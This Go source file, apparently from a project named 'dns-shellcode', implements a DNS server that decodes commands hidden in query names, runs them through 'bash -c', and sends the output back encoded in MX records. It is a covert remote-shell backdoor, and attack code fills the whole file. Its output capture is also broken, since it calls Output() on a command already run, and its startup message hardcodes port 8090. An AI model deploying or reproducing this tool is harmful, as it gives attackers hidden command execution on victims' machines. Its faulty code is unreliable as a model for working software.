package protocol

import (
	"dns-shellcode/main/encoder"
	"fmt"
	"github.com/miekg/dns"
	"os"
	"os/exec"
)

type dnsHandler struct {
	server *DNSServer
}

func newDnsHandler(s *DNSServer) *dnsHandler {
	return &dnsHandler{server: s}
}

type DNSServer struct {
	port    string
	encoder encoder.StringEncoder
	handler *dnsHandler
}

func NewDnsServer(port string, encoder encoder.StringEncoder) *DNSServer {
	d := &DNSServer{port: port, encoder: encoder}
	d.handler = newDnsHandler(d)
	return d
}

func (s DNSServer) Serve() {
	server := s.createServer()

	fmt.Println("Starting DNS server on port 8090")
	err := server.ListenAndServe()
	if err != nil {
		fmt.Printf("Failed to start server: %s\n", err.Error())
	}
}

func (s DNSServer) createServer() *dns.Server {
	server := &dns.Server{
		Addr:      ":" + s.port,
		Net:       "tcp",
		Handler:   s.handler,
		ReusePort: true,
	}
	return server
}

func (s DNSServer) handleQuestion(question dns.Question) {

}

func (h *dnsHandler) ServeDNS(w dns.ResponseWriter, r *dns.Msg) {
	msg := new(dns.Msg)
	msg.SetReply(r)
	msg.Authoritative = true

	for _, question := range r.Question {
		command := h.server.encoder.Decode(question.Name)
		fmt.Printf("Received command: %s\n", command)
		output := getCommandOutput(executeCommand(command))
		fmt.Printf("Result: %s", output)
		encoded := h.server.encoder.Encode(output)
		rr, _ := dns.NewRR(encoded + " 3600 IN MX 10 example.com")
		msg.Answer = append(msg.Answer, rr)
	}
	err := w.WriteMsg(msg)
	if err != nil {
		fmt.Println(err)
		return
	}
}

func executeCommand(command string) *exec.Cmd {
	cmd := exec.Command("bash", "-c", command)
	cmd.Stdin = os.Stdin
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	_ = cmd.Run()
	return cmd
}

func getCommandOutput(cmd *exec.Cmd) string {
	output, _ := cmd.Output()
	return string(output)
}
